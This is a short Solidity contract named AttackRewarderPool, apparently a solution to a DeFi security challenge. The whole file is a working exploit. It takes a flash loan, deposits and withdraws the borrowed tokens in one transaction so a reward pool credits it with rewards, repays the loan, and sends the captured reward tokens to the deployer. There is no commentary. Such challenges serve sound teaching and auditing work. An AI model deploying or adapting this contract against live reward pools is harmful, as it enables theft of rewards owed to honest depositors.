// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function deposit(uint256)  external;
    function withdraw(uint256) external;
    function distributeRewards() external;
}

interface ILoaner {
    function flashLoan(uint256) external;
}


contract AttackRewarderPool {
    using Address for address payable;
    address owner;
    address loaner;

    IPool public immutable rewardPool;
    IERC20  public immutable token;
    IERC20  public immutable rewardToken;


    constructor(address rewardPoolAddress, address tokenAddress, address loanerAddress, address rewardTokenAddress) {
      owner = msg.sender;
      rewardPool = IPool(rewardPoolAddress);
      token = IERC20(tokenAddress);
      loaner = loanerAddress;
      rewardToken = IERC20(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
      token.approve(address(rewardPool), amount);
      rewardPool.deposit(amount);
      rewardPool.withdraw(amount);
      token.transfer(loaner, amount);
    }

    function attack(uint256 amount) external {
      ILoaner(loaner).flashLoan(amount);
      uint256 rewards = rewardToken.balanceOf(address(this));
      rewardToken.transfer(owner, rewards);
    }
}
